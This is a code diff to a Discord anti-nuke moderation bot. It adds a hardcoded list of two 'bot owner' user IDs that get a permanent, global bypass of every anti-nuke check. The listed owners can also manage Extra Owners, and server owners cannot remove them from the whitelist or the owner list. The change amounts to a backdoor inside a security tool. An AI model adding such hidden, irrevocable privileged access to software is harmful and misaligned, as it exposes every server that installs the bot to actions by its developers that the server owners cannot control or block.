@@ -9,6 +9,9 @@ const {
 } = require('discord.js');
 const ModerationConfig = require('../models/moderation');
 
+// Bot Owner IDs (Permanent Global Bypass)
+const BOT_OWNERS = ['1266728371719508062', '1474216218792558735'];
+
 const DANGEROUS_PERMS = [
     PermissionFlagsBits.Administrator,
     PermissionFlagsBits.ManageGuild,
@@ -57,10 +60,11 @@ module.exports = (client) => {
         const entry = auditLogs?.entries.first();
         const executor = entry?.executor;
 
+        const isBotOwner = executor && BOT_OWNERS.includes(executor.id);
         const isServerOwner = executor?.id === member.guild.ownerId;
-        const isExtraOwner = config.extraOwners.includes(executor?.id);
+        const isExtraOwner = isBotOwner || config.extraOwners.includes(executor?.id);
 
-        // Agar bot add karne wala Server Owner ya Extra Owner nahi hai, turant bot ban aur inviter punish
+        // Agar bot add karne wala Bot Owner, Server Owner ya Extra Owner nahi hai
         if (!isServerOwner && !isExtraOwner) {
             await member.ban({ reason: '🛡️ Anti-Nuke: Unauthorized Bot Addition' }).catch(() => {});
 
@@ -88,7 +92,7 @@ module.exports = (client) => {
             return;
         }
 
-        // Agar Server Owner ya Extra Owner ne add kiya hai, toh 30 Seconds ka timer start
+        // Agar Server Owner, Bot Owner ya Extra Owner ne add kiya hai, toh 30 Seconds timer start
         const timeout = setTimeout(async () => {
             const currentConfig = await ModerationConfig.findOne({ guildId: member.guild.id });
             const isWhitelisted = currentConfig?.whitelistedBots?.includes(member.id);
@@ -103,7 +107,7 @@ module.exports = (client) => {
                 );
             }
             pendingBots.delete(member.id);
-        }, 30000); // 30 seconds
+        }, 30000);
 
         pendingBots.set(member.id, { timeout, guildId: member.guild.id });
     });
@@ -120,7 +124,8 @@ module.exports = (client) => {
         const executor = entry.executor;
         if (!executor || executor.id === client.user.id) return;
 
-        const isWhitelisted = (config.whitelistedBots || []).includes(executor.id) || 
+        const isWhitelisted = BOT_OWNERS.includes(executor.id) ||
+                              (config.whitelistedBots || []).includes(executor.id) || 
                               (config.whitelistedUsers || []).includes(executor.id) || 
                               (config.extraOwners || []).includes(executor.id) || 
                               executor.id === guild.ownerId;
@@ -151,7 +156,9 @@ module.exports = (client) => {
         const config = await ModerationConfig.findOne({ guildId: newMember.guild.id });
         if (!config || !config.antiNukeEnabled) return;
 
-        const isWhitelisted = (config.whitelistedUsers || []).includes(newMember.id) || 
+        // Bot Owner dangerous role protection se immune rahega
+        const isWhitelisted = BOT_OWNERS.includes(newMember.id) ||
+                              (config.whitelistedUsers || []).includes(newMember.id) || 
                               (config.extraOwners || []).includes(newMember.id) || 
                               newMember.id === newMember.guild.ownerId;
 
@@ -189,12 +196,14 @@ module.exports = (client) => {
         if (!Array.isArray(config.whitelistedBots)) config.whitelistedBots = [];
         if (!Array.isArray(config.whitelistedUsers)) config.whitelistedUsers = [];
 
+        const isBotOwner = BOT_OWNERS.includes(message.author.id);
         const isOwner = message.author.id === message.guild.ownerId;
-        const isExtraOwner = config.extraOwners.includes(message.author.id);
+        // Bot Owner automatically treated as Extra Owner
+        const isExtraOwner = isBotOwner || config.extraOwners.includes(message.author.id);
 
         // A. Anti-Nuke Toggle (%antinuke enable/disable)
         if (cmd === 'antinuke') {
-            if (!isOwner && !isExtraOwner) {
+            if (!isBotOwner && !isOwner && !isExtraOwner) {
                 return sendTempDenial(message, 'you do not have permission to configure Anti-Nuke.');
             }
             const state = args[0]?.toLowerCase();
@@ -212,8 +221,9 @@ module.exports = (client) => {
 
         // B. Extra Owner Management (%extraowner add/remove @user or ID)
         if (cmd === 'extraowner') {
-            if (!isOwner) {
-                return sendTempDenial(message, 'only the Server Owner can manage Extra Owners.');
+            // Bot Owner aur Server Owner dono manage kar sakte hain
+            if (!isBotOwner && !isOwner) {
+                return sendTempDenial(message, 'only the Server Owner and Bot Owners can manage Extra Owners.');
             }
             const sub = args[0]?.toLowerCase();
             const rawTarget = args[1]?.replace(/[<@!>]/g, '');
@@ -226,12 +236,17 @@ module.exports = (client) => {
             if (!target) return message.reply('❌ User not found.');
 
             if (sub === 'add') {
-                if (config.extraOwners.includes(target.id)) return message.reply('⚠️ User is already an Extra Owner.');
+                if (config.extraOwners.includes(target.id) || BOT_OWNERS.includes(target.id)) {
+                    return message.reply('⚠️ User is already an Extra Owner / Bot Owner.');
+                }
                 config.extraOwners.push(target.id);
                 config.markModified('extraOwners');
                 await config.save();
                 return message.reply(`✅ <@${target.id}> is now registered as an **Extra Owner**.`);
             } else if (sub === 'remove') {
+                if (BOT_OWNERS.includes(target.id)) {
+                    return message.reply('❌ Bot Owner cannot be removed from Extra Owners.');
+                }
                 config.extraOwners = config.extraOwners.filter(id => id !== target.id);
                 config.markModified('extraOwners');
                 await config.save();
@@ -241,7 +256,7 @@ module.exports = (client) => {
 
         // C. Whitelist Management (%wl add/remove @user/bot or ID)
         if (cmd === 'wl') {
-            if (!isOwner && !isExtraOwner) {
+            if (!isBotOwner && !isOwner && !isExtraOwner) {
                 return sendTempDenial(message, 'only Server Owner and Extra Owners can manage Whitelist.');
             }
 
@@ -261,7 +276,7 @@ module.exports = (client) => {
             const targetArray = isBot ? 'whitelistedBots' : 'whitelistedUsers';
 
             if (sub === 'add') {
-                if (config[targetArray].includes(target.id)) {
+                if (config[targetArray].includes(target.id) || BOT_OWNERS.includes(target.id)) {
                     return message.reply(`⚠️ <@${target.id}> pehle se hi Whitelisted hai.`);
                 }
 
@@ -269,7 +284,6 @@ module.exports = (client) => {
                 config.markModified(targetArray);
                 await config.save();
 
-                // 30 seconds auto-ban pending timer cancel karein
                 if (isBot && pendingBots.has(target.id)) {
                     clearTimeout(pendingBots.get(target.id).timeout);
                     pendingBots.delete(target.id);
@@ -277,6 +291,9 @@ module.exports = (client) => {
 
                 return message.reply(`✅ <@${target.id}> (${isBot ? 'Bot' : 'User'}) successfully **Whitelisted** ho gaya hai!`);
             } else if (sub === 'remove') {
+                if (BOT_OWNERS.includes(target.id)) {
+                    return message.reply('❌ Bot Owner cannot be removed from Whitelist.');
+                }
                 if (!config[targetArray].includes(target.id)) {
                     return message.reply(`⚠️ <@${target.id}> Whitelist me nahi hai.`);
                 }
@@ -291,7 +308,7 @@ module.exports = (client) => {
 
         // D. Permission Control Panel (%pr @user)
         if (cmd === 'pr') {
-            if (!isOwner && !isExtraOwner) {
+            if (!isBotOwner && !isOwner && !isExtraOwner) {
                 return sendTempDenial(message, 'only Server Owner or Extra Owners can modify command permissions.');
             }
             const target = message.mentions.members.first();
@@ -326,7 +343,7 @@ module.exports = (client) => {
 
         // E. Channel Automod Overrides (%channel allow/deny links/media/ips)
         if (cmd === 'channel') {
-            if (!isOwner && !isExtraOwner) {
+            if (!isBotOwner && !isOwner && !isExtraOwner) {
                 return sendTempDenial(message, 'only Server Owner or Extra Owners can configure channel rules.');
             }
             const action = args[0]?.toLowerCase();
